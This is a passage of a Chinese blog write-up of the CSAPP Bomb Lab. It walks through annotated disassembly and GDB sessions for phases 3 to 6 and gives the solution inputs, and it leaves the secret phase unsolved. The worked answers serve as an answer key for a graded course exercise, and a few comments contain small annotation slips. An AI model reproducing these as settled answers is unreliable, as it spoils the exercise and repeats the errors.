 8048cc6:	3d 8f 00 00 00       	cmp    $0x8f,%eax
 8048ccb:	74 3a                	je     8048d07 &lt;phase_3+0x11c&gt;
 8048ccd:	e8 14 0a 00 00       	call   80496e6 &lt;explode_bomb&gt;
 8048cd2:	eb 33                	jmp    8048d07 &lt;phase_3+0x11c&gt;

# 6
 8048cd4:	c6 45 ff 77          	movb   $0x77,-0x1(%ebp)			# 77 对应字符 w 为后文埋下伏笔
 8048cd8:	8b 45 f0             	mov    -0x10(%ebp),%eax         # ebp - 0x10 是第三个输入的数字
;  (gdb) p /x *0xffffcc78
; $31 = 0x1b1
 8048cdb:	3d b1 01 00 00       	cmp    $0x1b1,%eax              # $0x1b1 = 433 第三个数字和 0x1b1 比较
 8048ce0:	74 25                	je     8048d07 &lt;phase_3+0x11c&gt;
 8048ce2:	e8 ff 09 00 00       	call   80496e6 &lt;explode_bomb&gt;
 8048ce7:	eb 1e                	jmp    8048d07 &lt;phase_3+0x11c&gt;

 # 7
 8048ce9:	c6 45 ff 76          	movb   $0x76,-0x1(%ebp)
 8048ced:	8b 45 f0             	mov    -0x10(%ebp),%eax         
 8048cf0:	3d 9f 03 00 00       	cmp    $0x39f,%eax
 8048cf5:	74 10                	je     8048d07 &lt;phase_3+0x11c&gt;
 8048cf7:	e8 ea 09 00 00       	call   80496e6 &lt;explode_bomb&gt;

 8048cfc:	eb 09                	jmp    8048d07 &lt;phase_3+0x11c&gt;
 8048cfe:	c6 45 ff 65          	movb   $0x65,-0x1(%ebp)        # 爆炸
 8048d02:	e8 df 09 00 00       	call   80496e6 &lt;explode_bomb&gt;
  
</code></pre>
<blockquote>
<p>汇编中用到哪里，GDB 就查哪里。<code>-0x10(%ebp)</code> 指向我们第三个输入的数字。</p>
</blockquote>
<pre><code class="language-asm"># 返回
 8048d07:	0f b6 45 ef          	movzbl -0x11(%ebp),%eax        # 零扩展传送到eax
;  (gdb) p *(char*) 0xffffcc77
; $37 = 119 'w'
 8048d0b:	38 45 ff             	cmp    %al,-0x1(%ebp)          # al是rax的低字节 上文的伏笔
 8048d0e:	74 05                	je     8048d15 &lt;phase_3+0x12a&gt; # 等于才成功，否则爆炸
 8048d10:	e8 d1 09 00 00       	call   80496e6 &lt;explode_bomb&gt;
 8048d15:	c9                   	leave  
 8048d16:	c3                   	ret  
</code></pre>
<blockquote>
<p>汇编中用到哪里，GDB 就查哪里。<code>-0x11(%ebp)</code> 指向我们第二个输入的字符。</p>
</blockquote>
<p>解析及要点：</p>
<ul>
<li>本层需输入 3 个数据。根据跳转表内容输入符合要求的数字。比如：<code>6 w 433</code>。</li>
</ul>
<p>点评与提示：</p>
<ul>
<li>识别 <code>switch</code></li>
<li>善用 <code>GDB</code></li>
</ul>
<h2>Phase 4 - 递归函数</h2>
<p>第四层使用到了一个函数，我们先解读这个函数：</p>
<pre><code class="language-asm">08048d17 &lt;func4&gt;:
 8048d17:	55                   	push   %ebp
 8048d18:	89 e5                	mov    %esp,%ebp
 8048d1a:	53                   	push   %ebx
 8048d1b:	83 ec 08             	sub    $0x8,%esp
 8048d1e:	83 7d 08 01          	cmpl   $0x1,0x8(%ebp)            
 8048d22:	7f 09                	jg     8048d2d &lt;func4+0x16&gt;  # if x&gt;1
 8048d24:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)       # else
 8048d2b:	eb 21                	jmp    8048d4e &lt;func4+0x37&gt;

 8048d2d:	8b 45 08             	mov    0x8(%ebp),%eax        # if x&gt;1
 8048d30:	48                   	dec    %eax              
 8048d31:	89 04 24             	mov    %eax,(%esp)           # x-1 作为参数递归
 8048d34:	e8 de ff ff ff       	call   8048d17 &lt;func4&gt;
 8048d39:	89 c3                	mov    %eax,%ebx             # f(x-1) 的结果暂存
 8048d3b:	8b 45 08             	mov    0x8(%ebp),%eax
 8048d3e:	83 e8 02             	sub    $0x2,%eax      
 8048d41:	89 04 24             	mov    %eax,(%esp)           # x-2 作为参数递归
 8048d44:	e8 ce ff ff ff       	call   8048d17 &lt;func4&gt;
 8048d49:	01 c3                	add    %eax,%ebx             # f(x-1) 的结果+f(x-1)
 8048d4b:	89 5d f8             	mov    %ebx,-0x8(%ebp)       # 作为返回结果

 8048d4e:	8b 45 f8             	mov    -0x8(%ebp),%eax # 1 返回1
 8048d51:	83 c4 08             	add    $0x8,%esp
 8048d54:	5b                   	pop    %ebx
 8048d55:	5d                   	pop    %ebp
 8048d56:	c3                   	ret   
</code></pre>
<p>不难看出是个递归求斐波那契数列的函数：</p>
<pre><code class="language-c">func4(x){
	if x&gt;1:
		return func4(x-1)+func4(x-2)
	else:
		return 1;
}
// 输入：0 1 2 3 4 5 ... 13
// 输出：1 1 2 3 5 8 ... 377
</code></pre>
<p>第四层的逻辑更加简单：</p>
<pre><code class="language-asm">08048d57 &lt;phase_4&gt;:
 8048d57:	55                   	push   %ebp
 8048d58:	89 e5                	mov    %esp,%ebp
 8048d5a:	83 ec 28             	sub    $0x28,%esp
 8048d5d:	8d 45 f4             	lea    -0xc(%ebp),%eax
 8048d60:	89 44 24 08          	mov    %eax,0x8(%esp)
 8048d64:	c7 44 24 04 34 9a 04 	movl   $0x8049a34,0x4(%esp) #  0x8049a34 -&gt; &quot;%d&quot;
 8048d6b:	08 
 8048d6c:	8b 45 08             	mov    0x8(%ebp),%eax
 8048d6f:	89 04 24             	mov    %eax,(%esp)
 8048d72:	e8 f1 fa ff ff       	call   8048868 &lt;sscanf@plt&gt;
 8048d77:	89 45 fc             	mov    %eax,-0x4(%ebp)      
 8048d7a:	83 7d fc 01          	cmpl   $0x1,-0x4(%ebp)      # 只能输入一个数i，否则爆炸
 8048d7e:	75 07                	jne    8048d87 &lt;phase_4+0x30&gt; # 跳转到爆炸
 8048d80:	8b 45 f4             	mov    -0xc(%ebp),%eax  #   -0xc(%ebp)存放我们第一个输入的数i   
;  (gdb) p  *0xffffcc7c
; $42 = 13
 8048d83:	85 c0                	test   %eax,%eax            # -0xc(%ebp) 不能为零
 8048d85:	7f 05                	jg     8048d8c &lt;phase_4+0x35&gt; # 大于才成功，否则爆炸
 8048d87:	e8 5a 09 00 00       	call   80496e6 &lt;explode_bomb&gt;
 8048d8c:	8b 45 f4             	mov    -0xc(%ebp),%eax
 8048d8f:	89 04 24             	mov    %eax,(%esp)          # 将数字传参
 8048d92:	e8 80 ff ff ff       	call   8048d17 &lt;func4&gt;      # i 进入函数func4

 8048d97:	89 45 f8             	mov    %eax,-0x8(%ebp)
 8048d9a:	81 7d f8 79 01 00 00 	cmpl   $0x179,-0x8(%ebp)    # 结果必须为 0x179 = 377 (斐波那契数列第13项)
 8048da1:	74 05                	je     8048da8 &lt;phase_4+0x51&gt; # 等于才成功，否则爆炸
 8048da3:	e8 3e 09 00 00       	call   80496e6 &lt;explode_bomb&gt;
 8048da8:	c9                   	leave  
 8048da9:	c3                   	ret  
</code></pre>
<p>解析及要点：</p>
<ul>
<li>本层需输入 1 个数据。使得函数的输出结果与给定数字相等。在这里为 <code>13</code></li>
</ul>
<p>点评与提示：</p>
<ul>
<li>会读递归函数</li>
</ul>
<h2>Phase 5 - 算数</h2>
<pre><code class="language-asm">08048daa &lt;phase_5&gt;:
 8048daa:	55                   	push   %ebp
 8048dab:	89 e5                	mov    %esp,%ebp
 8048dad:	83 ec 18             	sub    $0x18,%esp
 8048db0:	8b 45 08             	mov    0x8(%ebp),%eax
 8048db3:	89 04 24             	mov    %eax,(%esp)
 8048db6:	e8 3a 03 00 00       	call   80490f5 &lt;string_length&gt;
 8048dbb:	89 45 fc             	mov    %eax,-0x4(%ebp)
 8048dbe:	83 7d fc 06          	cmpl   $0x6,-0x4(%ebp)
 8048dc2:	74 05                	je     8048dc9 &lt;phase_5+0x1f&gt; # 输入的字符串长度必须为 6 
 8048dc4:	e8 1d 09 00 00       	call   80496e6 &lt;explode_bomb&gt;
 8048dc9:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%ebp)        # result = 0
 8048dd0:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)		  # i = 0
 8048dd7:	eb 1c                	jmp    8048df5 &lt;phase_5+0x4b&gt;
</code></pre>
<p>我们看到后文老是出现 <code>-0x8(%ebp)</code>，<code>-0xc(%ebp)</code>。又看到熟悉的循环结构，干脆分别定义变量 <code>result</code>，<code>i</code> 辅助我们进行分析。</p>
<pre><code class="language-asm"># 循环开始
 8048dd9:	8b 45 f4             	mov    -0xc(%ebp),%eax
 8048ddc:	03 45 08             	add    0x8(%ebp),%eax  # 0x804a9a0 + i 就是遍历输入的字符串

 8048ddf:	0f b6 00             	movzbl (%eax),%eax
 8048de2:	0f be c0             	movsbl %al,%eax
 8048de5:	83 e0 0f             	and    $0xf,%eax       # 对每一个字符串取低位字节 得到 k
 8048de8:	8b 04 85 c0 a5 04 08 	mov    0x804a5c0(,%eax,4),%eax # 取 arr[k]

 8048def:	01 45 f8             	add    %eax,-0x8(%ebp)          # result += arr[k]
 8048df2:	ff 45 f4             	incl   -0xc(%ebp)				# i++

 8048df5:	83 7d f4 05          	cmpl   $0x5,-0xc(%ebp)
 8048df9:	7e de                	jle    8048dd9 &lt;phase_5+0x2f&gt;  # i &lt;= 5 继续循环
 8048dfb:	83 7d f8 24          	cmpl   $0x24,-0x8(%ebp)			# result == 36
 8048dff:	74 05                	je     8048e06 &lt;phase_5+0x5c&gt;   # 必须相等
 8048e01:	e8 e0 08 00 00       	call   80496e6 &lt;explode_bomb&gt;
 8048e06:	c9                   	leave  
 8048e07:	c3                   	ret    
</code></pre>
<pre><code class="language-gdb">(gdb) p  (char*) 0x804a9a0
$56 = 0x804a9a0 &lt;input_strings+320&gt; &quot;@@BBAA&quot;  # 假设输入的字符串为 `@@BBAA`
# 0x804a5c0: {2, 10, 6, 1, 12, 16, 9, 3, 4, 7, 14, 5, 11, 8, 15, 13,     ...}
</code></pre>
<p><code>0x804a9a0</code> 是一个数组 arr 的地址，我们需要输入包含 6 个字符的字符串：</p>
<ul>
<li>每个字符的低 4 位作为数组 arr 的索引 i。</li>
<li>本例中，需要使得 <code>arr[0]</code>+<code>arr[1]</code>+...+<code>arr[5]</code> 的总和为 36 即可通关。</li>
</ul>
<p>例如：</p>
<ul>
<li>36 = 2+2+6+6+10+10</li>
<li>各加数对应数组的序号为 0 0 2 2 1 1</li>
<li>ASCII 中，<code>@</code>：0x40   <code>B</code>：0x42  <code>A</code>：0x41，也就是对应序号 0, 2, 1</li>
<li>答案即为 <code>@@BBAA</code></li>
</ul>
<p>解析及要点：</p>
<ul>
<li>本层需输入合适字符串指示数组的下标，使得下标对应数组数字之和等于指定值即可。</li>
<li>知道输入字符串的存储位置</li>
</ul>
<p>点评与提示：</p>
<ul>
<li>汇编的融会贯通</li>
</ul>
<h2>Phase 6 - 链表排序</h2>
<pre><code class="language-asm">08048e08 &lt;phase_6&gt;:
 8048e08:	55                   	push   %ebp
 8048e09:	89 e5                	mov    %esp,%ebp
 8048e0b:	83 ec 48             	sub    $0x48,%esp
 8048e0e:	c7 45 f0 3c a6 04 08 	movl   $0x804a63c,-0x10(%ebp) # $0x804a63c-&gt; 0x329
 8048e15:	8d 45 d8             	lea    -0x28(%ebp),%eax
 8048e18:	89 44 24 04          	mov    %eax,0x4(%esp)
 8048e1c:	8b 45 08             	mov    0x8(%ebp),%eax
 8048e1f:	89 04 24             	mov    %eax,(%esp)
 8048e22:	e8 65 02 00 00       	call   804908c &lt;read_six_numbers&gt;
 8048e27:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%ebp)        # i=0
 8048e2e:	eb 48                	jmp    8048e78 &lt;phase_6+0x70&gt;

# 循环A ------- 开始 用于判断：每个元素不相等，且每个元素不为0
 8048e30:	8b 45 f8             	mov    -0x8(%ebp),%eax
 8048e33:	8b 44 85 d8          	mov    -0x28(%ebp,%eax,4),%eax  # -0x28(%ebp) 的位置是输入数组的第一个元素
 8048e37:	85 c0                	test   %eax,%eax   
 8048e39:	7e 0c                	jle    8048e47 &lt;phase_6+0x3f&gt;  # arr[i] == 0 跳转爆炸
 8048e3b:	8b 45 f8             	mov    -0x8(%ebp),%eax         # arr[i] != 0
 8048e3e:	8b 44 85 d8          	mov    -0x28(%ebp,%eax,4),%eax
 8048e42:	83 f8 06             	cmp    $0x6,%eax               
 8048e45:	7e 05                	jle    8048e4c &lt;phase_6+0x44&gt;  # arr[i]&lt;= 6 否则爆炸
 8048e47:	e8 9a 08 00 00       	call   80496e6 &lt;explode_bomb&gt;

 8048e4c:	8b 45 f8             	mov    -0x8(%ebp),%eax
 8048e4f:	40                   	inc    %eax					# i++
 8048e50:	89 45 fc             	mov    %eax,-0x4(%ebp)      # 存储ti = i+1
 8048e53:	eb 1a                	jmp    8048e6f &lt;phase_6+0x67&gt;

 8048e55:	8b 45 f8             	mov    -0x8(%ebp),%eax
 8048e58:	8b 54 85 d8          	mov    -0x28(%ebp,%eax,4),%edx  # edx = arr[i]
 8048e5c:	8b 45 fc             	mov    -0x4(%ebp),%eax
 8048e5f:	8b 44 85 d8          	mov    -0x28(%ebp,%eax,4),%eax  # eax = arr[i+1]
 8048e63:	39 c2                	cmp    %eax,%edx
 8048e65:	75 05                	jne    8048e6c &lt;phase_6+0x64&gt;   # 必须 arr[i] != arr[i+1] 否则爆炸
 8048e67:	e8 7a 08 00 00       	call   80496e6 &lt;explode_bomb&gt;
 8048e6c:	ff 45 fc             	incl   -0x4(%ebp)               # ti++

 8048e6f:	83 7d fc 05          	cmpl   $0x5,-0x4(%ebp)		
 8048e73:	7e e0                	jle    8048e55 &lt;phase_6+0x4d&gt; # ti&lt;=5 则跳转
 8048e75:	ff 45 f8             	incl   -0x8(%ebp)             # i+1==5 ,i++ , i=6  即将退出循环

 8048e78:	83 7d f8 05          	cmpl   $0x5,-0x8(%ebp)
 8048e7c:	7e b2                	jle    8048e30 &lt;phase_6+0x28&gt;  # i&lt;=5 循环（遍历6个元素）
 # 循环A ---- ------ 结束


 8048e7e:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%ebp)		# j=0
 8048e85:	eb 34                	jmp    8048ebb &lt;phase_6+0xb3&gt;


 # 循环B 开始 ---- 将数组平移到内存中的特定的位置$0x804a63c 开始的位置，8位隔开
 # 这是个链表
 8048e87:	8b 45 f0             	mov    -0x10(%ebp),%eax     # 是个地址$0x804a63c，提前存有 0x329 = 809
 8048e8a:	89 45 f4             	mov    %eax,-0xc(%ebp)      # t[1] 表示上一次的计算结果 = $0x804a63c
 8048e8d:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)      # tj = 1
 8048e94:	eb 0c                	jmp    8048ea2 &lt;phase_6+0x9a&gt;

 8048e96:	8b 45 f4             	mov    -0xc(%ebp),%eax      # t[0]地址$0x804a63c
 8048e99:	8b 40 08             	mov    0x8(%eax),%eax		# 0x8(%eax) =$0x804a644 -&gt; $0x804a630
 8048e9c:	89 45 f4             	mov    %eax,-0xc(%ebp)      # 链表结点下移
 8048e9f:	ff 45 fc             	incl   -0x4(%ebp)           # tj++

 8048ea2:	8b 45 f8             	mov    -0x8(%ebp),%eax
 8048ea5:	8b 44 85 d8          	mov    -0x28(%ebp,%eax,4),%eax # arr[j]
 8048ea9:	3b 45 fc             	cmp    -0x4(%ebp),%eax         # tj
 8048eac:	7f e8                	jg     8048e96 &lt;phase_6+0x8e&gt;  # arr[j]&gt;tj 大于

 8048eae:	8b 55 f8             	mov    -0x8(%ebp),%edx         # edx = j
 8048eb1:	8b 45 f4             	mov    -0xc(%ebp),%eax		   # eax = t[0]
 8048eb4:	89 44 95 c0          	mov    %eax,-0x40(%ebp,%edx,4) # 存储统计结果
 8048eb8:	ff 45 f8             	incl   -0x8(%ebp)              # j++

 8048ebb:	83 7d f8 05          	cmpl   $0x5,-0x8(%ebp)
 8048ebf:	7e c6                	jle    8048e87 &lt;phase_6+0x7f&gt; # j&lt;=5 循环（遍历6个元素）
# 循环B ------------------------ 结束

 8048ec1:	8b 45 c0             	mov    -0x40(%ebp),%eax   # arr8[0]
 8048ec4:	89 45 f0             	mov    %eax,-0x10(%ebp)   #  
 8048ec7:	8b 45 f0             	mov    -0x10(%ebp),%eax
 8048eca:	89 45 f4             	mov    %eax,-0xc(%ebp)    # t[1] 存储上一次运算结果 = arr8[0]
 8048ecd:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)    # k = 1
 8048ed4:	eb 19                	jmp    8048eef &lt;phase_6+0xe7&gt;

# 循环C ------------------------- 开始 调整链表内的顺序
 8048ed6:	8b 45 f8             	mov    -0x8(%ebp),%eax    # k
 8048ed9:	8b 54 85 c0          	mov    -0x40(%ebp,%eax,4),%edx # edx = arr8[k]
 8048edd:	8b 45 f4             	mov    -0xc(%ebp),%eax         # eax = $0x804a63c
 8048ee0:	89 50 08             	mov    %edx,0x8(%eax)          # $0x804a63c+8 = arr8[k]
 8048ee3:	8b 45 f4             	mov    -0xc(%ebp),%eax
 8048ee6:	8b 40 08             	mov    0x8(%eax),%eax          # $0x804a63c+8
 8048ee9:	89 45 f4             	mov    %eax,-0xc(%ebp)         # 基地址上移8
 8048eec:	ff 45 f8             	incl   -0x8(%ebp)          # k++

 8048eef:	83 7d f8 05          	cmpl   $0x5,-0x8(%ebp)  
 8048ef3:	7e e1                	jle    8048ed6 &lt;phase_6+0xce&gt;  # k&lt;=5 循环（遍历5个元素，因为k从1开始的）
# 循环C -------------------------- 结束

 8048ef5:	8b 45 f4             	mov    -0xc(%ebp),%eax
 8048ef8:	c7 40 08 00 00 00 00 	movl   $0x0,0x8(%eax)   # 基址设置为0
 8048eff:	8b 45 f0             	mov    -0x10(%ebp),%eax # 重新获取$0x804a63c
 8048f02:	89 45 f4             	mov    %eax,-0xc(%ebp)
 8048f05:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%ebp) # l = 0
 8048f0c:	eb 22                	jmp    8048f30 &lt;phase_6+0x128&gt;

# 循环 D -------- 开始：左边的数大于右边的数
 8048f0e:	8b 45 f4             	mov    -0xc(%ebp),%eax # $0x804a63c
 8048f11:	8b 10                	mov    (%eax),%edx
 8048f13:	8b 45 f4             	mov    -0xc(%ebp),%eax
 8048f16:	8b 40 08             	mov    0x8(%eax),%eax
 8048f19:	8b 00                	mov    (%eax),%eax
 8048f1b:	39 c2                	cmp    %eax,%edx       # 相隔 8  的两个基址
 8048f1d:	7d 05                	jge    8048f24 &lt;phase_6+0x11c&gt; #必须： 左基址 &gt;= 右基址 
 8048f1f:	e8 c2 07 00 00       	call   80496e6 &lt;explode_bomb&gt;
 8048f24:	8b 45 f4             	mov    -0xc(%ebp),%eax
 8048f27:	8b 40 08             	mov    0x8(%eax),%eax # 基址+8
 8048f2a:	89 45 f4             	mov    %eax,-0xc(%ebp) # 基址更新
 8048f2d:	ff 45 f8             	incl   -0x8(%ebp)     # l++

 8048f30:	83 7d f8 04          	cmpl   $0x4,-0x8(%ebp) # l&lt;=4 5 次
 8048f34:	7e d8                	jle    8048f0e &lt;phase_6+0x106&gt;
# 循环D结束

 8048f36:	c9                   	leave  
 8048f37:	c3                   	ret   
</code></pre>
<p>本例中出现的魔数 <code>0x804a63c</code> 为链表头结点地址，通过 GDB 我们可以得知链表结点地址以及存储的值：</p>
<pre><code class="language-gdb">; 0x804a63c 0x329
; 0x804a630 0x124
; 0x804a638 0x325
; 0x804a62c 0x178
; 0x804a620 0x207
; 0x804a614 0x92
; 0x804a608 0x00 NULL
</code></pre>
<p>输入的数组要求：</p>
<ol>
<li>6 个数字互不相同，范围 1~6</li>
<li>第 n 个数字值 v，代表第 n 个结点排序后的位置为 v</li>
<li>结点排序后的结果为：结点代表的值降序排序</li>
</ol>
<p>解析及要点：</p>
<ul>
<li>本层需输入 6 个数字对链表进行排序，使得排序结果满足目标要求</li>
<li>必须识别出这是个链表</li>
<li>逐个循环阅读</li>
</ul>
<p>点评与提示：</p>
<ul>
<li>耐心耐心耐心</li>
</ul>
<h2>Secret Phase</h2>
<p>拆除炸弹各层的提示语如下：</p>
<pre><code class="language-text">Welcome to my fiendish little bomb. You have 6 phases with
which to blow yourself up. Have a nice day!
Phase 1 defused. How about the next one?
That's number 2.  Keep going!
Halfway there!
So you got that one.  Try this one.
Good work!  On to the next...
Congratulations! You've defused the bomb!
</code></pre>
<p>但这并不意味着炸弹已经拆除完成，注意到 <code>bomb.c</code> 文件中有邪恶博士😈在最后一层炸弹拆除时留下的注释：</p>
<pre><code class="language-c">/* Wow, they got it!  But isn't something... missing?  Perhaps
* something they overlooked?  Mua ha ha ha ha! */
</code></pre>
<p>反汇编得到的汇编代码中还存在一些隐藏内容：<code>&lt;func7&gt;</code> 以及 <code>&lt;secret_phase&gt;</code> 函数。</p>
<p>这部分就留给读者自己解决啦~~ 反正助教通过我的实验了，为了「完美主义」，我有时间在弄吧。</p>
<blockquote>
<p>看起来不多呢。</p>
</blockquote>
<pre><code class="language-asm">08048f38 &lt;fun7&gt;:
 8048f38:	55                   	push   %ebp
 8048f39:	89 e5                	mov    %esp,%ebp
 8048f3b:	83 ec 0c             	sub    $0xc,%esp
 8048f3e:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
 8048f42:	75 09                	jne    8048f4d &lt;fun7+0x15&gt;
 8048f44:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
 8048f4b:	eb 54                	jmp    8048fa1 &lt;fun7+0x69&gt;
 8048f4d:	8b 45 08             	mov    0x8(%ebp),%eax
 8048f50:	8b 00                	mov    (%eax),%eax
 8048f52:	3b 45 0c             	cmp    0xc(%ebp),%eax
 8048f55:	7e 1c                	jle    8048f73 &lt;fun7+0x3b&gt;
 8048f57:	8b 45 08             	mov    0x8(%ebp),%eax
 8048f5a:	8b 50 04             	mov    0x4(%eax),%edx
 8048f5d:	8b 45 0c             	mov    0xc(%ebp),%eax
 8048f60:	89 44 24 04          	mov    %eax,0x4(%esp)
 8048f64:	89 14 24             	mov    %edx,(%esp)
 8048f67:	e8 cc ff ff ff       	call   8048f38 &lt;fun7&gt;
 8048f6c:	01 c0                	add    %eax,%eax
 8048f6e:	89 45 fc             	mov    %eax,-0x4(%ebp)
 8048f71:	eb 2e                	jmp    8048fa1 &lt;fun7+0x69&gt;
 8048f73:	8b 45 08             	mov    0x8(%ebp),%eax
 8048f76:	8b 00                	mov    (%eax),%eax
 8048f78:	3b 45 0c             	cmp    0xc(%ebp),%eax
 8048f7b:	75 09                	jne    8048f86 &lt;fun7+0x4e&gt;
 8048f7d:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
 8048f84:	eb 1b                	jmp    8048fa1 &lt;fun7+0x69&gt;
 8048f86:	8b 45 08             	mov    0x8(%ebp),%eax
 8048f89:	8b 50 08             	mov    0x8(%eax),%edx
 8048f8c:	8b 45 0c             	mov    0xc(%ebp),%eax
 8048f8f:	89 44 24 04          	mov    %eax,0x4(%esp)
 8048f93:	89 14 24             	mov    %edx,(%esp)
 8048f96:	e8 9d ff ff ff       	call   8048f38 &lt;fun7&gt;
 8048f9b:	01 c0                	add    %eax,%eax
 8048f9d:	40                   	inc    %eax
 8048f9e:	89 45 fc             	mov    %eax,-0x4(%ebp)
 8048fa1:	8b 45 fc             	mov    -0x4(%ebp),%eax
 8048fa4:	c9                   	leave  
 8048fa5:	c3                   	ret    

08048fa6 &lt;secret_phase&gt;:
 8048fa6:	55                   	push   %ebp
 8048fa7:	89 e5                	mov    %esp,%ebp
 8048fa9:	83 ec 18             	sub    $0x18,%esp
 8048fac:	e8 a9 03 00 00       	call   804935a &lt;read_line&gt;
 8048fb1:	89 45 f4             	mov    %eax,-0xc(%ebp)
 8048fb4:	8b 45 f4             	mov    -0xc(%ebp),%eax
 8048fb7:	89 04 24             	mov    %eax,(%esp)
 8048fba:	e8 99 f8 ff ff       	call   8048858 &lt;atoi@plt&gt;
 8048fbf:	89 45 f8             	mov    %eax,-0x8(%ebp)
 8048fc2:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
 8048fc6:	7e 09                	jle    8048fd1 &lt;secret_phase+0x2b&gt;
 8048fc8:	81 7d f8 e9 03 00 00 	cmpl   $0x3e9,-0x8(%ebp)
 8048fcf:	7e 05                	jle    8048fd6 &lt;secret_phase+0x30&gt;
 8048fd1:	e8 10 07 00 00       	call   80496e6 &lt;explode_bomb&gt;
 8048fd6:	8b 45 f8             	mov    -0x8(%ebp),%eax
 8048fd9:	89 44 24 04          	mov    %eax,0x4(%esp)
 8048fdd:	c7 04 24 f0 a6 04 08 	movl   $0x804a6f0,(%esp)
 8048fe4:	e8 4f ff ff ff       	call   8048f38 &lt;fun7&gt;
 8048fe9:	89 45 fc             	mov    %eax,-0x4(%ebp)
 8048fec:	83 7d fc 06          	cmpl   $0x6,-0x4(%ebp)
 8048ff0:	74 05                	je     8048ff7 &lt;secret_phase+0x51&gt;
 8048ff2:	e8 ef 06 00 00       	call   80496e6 &lt;explode_bomb&gt;
 8048ff7:	c7 04 24 38 9a 04 08 	movl   $0x8049a38,(%esp)
 8048ffe:	e8 c5 f7 ff ff       	call   80487c8 &lt;puts@plt&gt;
 8049003:	e8 08 07 00 00       	call   8049710 &lt;phase_defused&gt;
 8049008:	c9                   	leave  
 8049009:	c3                   	ret    
 804900a:	90                   	nop
 804900b:	90                   	nop
</code></pre>
<h1>后续任务</h1>
<ul>
<li>[ ] 有时间再完善隐藏层部分的内容</li>
</ul>
<h1>本文参考</h1>
<ul>
<li><a href="https://zhuanlan.zhihu.com/p/472178808">CSAPP | Lab2-Bomb Lab 深入解析 - 知乎 (zhihu.com)</a> 文章提示了我第六层那个数据结构是个链表😅</li>
</ul>


                
            </main>

            <footer class="list-content-container">
                
                <details class="record-links" open="open">
                    <summary class="menu-title">
                        links
                        <span class="badge">4</span>
                    </summary>

                    <ul class="record-links-list">
                        
                        <li data-target-id="165066519">
                            <a href="#165066519">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_csapp-labs);">⬤</span>
                                    
                                </span>
                                
                                <span>CSAPP LAB-4 代码优化</span>
                                
                                <div class="record-links-context hover">
                                    <blockquote>
<p>[!notice] CSAPP LAB 实验</p>
<ul>
<li><a href="#3315008132" title="CSAPP LAB-1 位操作" class="record-link ">CSAPP LAB-1 位操作</a></li>
<li>CSAPP LAB-2 二进制炸弹实验（本文）</li>
<li><a href="#1735947091" title="CSAPP LAB-3 缓冲区溢出炸弹" class="record-link ">CSAPP LAB-3 缓冲区溢出炸弹</a></li>
<li><a href="#165066519" title="CSAPP LAB-4 代码优化" class="record-link highlight">CSAPP LAB-4 代码优化</a></li>
<li><a href="#1051831239" title="CSAPP LAB-5 手写动态存储分配器" class="record-link ">CSAPP LAB-5 手写动态存储分配器</a></li>
</ul>
</blockquote>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="1051831239">
                            <a href="#1051831239">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_csapp-labs);">⬤</span>
                                    
                                </span>
                                
                                <span>CSAPP LAB-5 手写动态存储分配器</span>
                                
                                <div class="record-links-context hover">
                                    <blockquote>
<p>[!notice] CSAPP LAB 实验</p>
<ul>
<li><a href="#3315008132" title="CSAPP LAB-1 位操作" class="record-link ">CSAPP LAB-1 位操作</a></li>
<li>CSAPP LAB-2 二进制炸弹实验（本文）</li>
<li><a href="#1735947091" title="CSAPP LAB-3 缓冲区溢出炸弹" class="record-link ">CSAPP LAB-3 缓冲区溢出炸弹</a></li>
<li><a href="#165066519" title="CSAPP LAB-4 代码优化" class="record-link ">CSAPP LAB-4 代码优化</a></li>
<li><a href="#1051831239" title="CSAPP LAB-5 手写动态存储分配器" class="record-link highlight">CSAPP LAB-5 手写动态存储分配器</a></li>
</ul>
</blockquote>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="1735947091">
                            <a href="#1735947091">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_csapp-labs);">⬤</span>
                                    
                                </span>
                                
                                <span>CSAPP LAB-3 缓冲区溢出炸弹</span>
                                
                                <div class="record-links-context hover">
                                    <blockquote>
<p>[!notice] CSAPP LAB 实验</p>
<ul>
<li><a href="#3315008132" title="CSAPP LAB-1 位操作" class="record-link ">CSAPP LAB-1 位操作</a></li>
<li>CSAPP LAB-2 二进制炸弹实验（本文）</li>
<li><a href="#1735947091" title="CSAPP LAB-3 缓冲区溢出炸弹" class="record-link highlight">CSAPP LAB-3 缓冲区溢出炸弹</a></li>
<li><a href="#165066519" title="CSAPP LAB-4 代码优化" class="record-link ">CSAPP LAB-4 代码优化</a></li>
<li><a href="#1051831239" title="CSAPP LAB-5 手写动态存储分配器" class="record-link ">CSAPP LAB-5 手写动态存储分配器</a></li>
</ul>
</blockquote>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="3315008132">
                            <a href="#3315008132">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_csapp-labs);">⬤</span>
                                    
                                </span>
                                
                                <span>CSAPP LAB-1 位操作</span>
                                
                                <div class="record-links-context hover">
                                    <blockquote>
<p>[!notice] CSAPP LAB 实验</p>
<ul>
<li><a href="#3315008132" title="CSAPP LAB-1 位操作" class="record-link highlight">CSAPP LAB-1 位操作</a></li>
<li>CSAPP LAB-2 二进制炸弹实验（本文）</li>
<li><a href="#1735947091" title="CSAPP LAB-3 缓冲区溢出炸弹" class="record-link ">CSAPP LAB-3 缓冲区溢出炸弹</a></li>
<li><a href="#165066519" title="CSAPP LAB-4 代码优化" class="record-link ">CSAPP LAB-4 代码优化</a></li>
<li><a href="#1051831239" title="CSAPP LAB-5 手写动态存储分配器" class="record-link ">CSAPP LAB-5 手写动态存储分配器</a></li>
</ul>
</blockquote>

                                </div>
                                
                            </a>
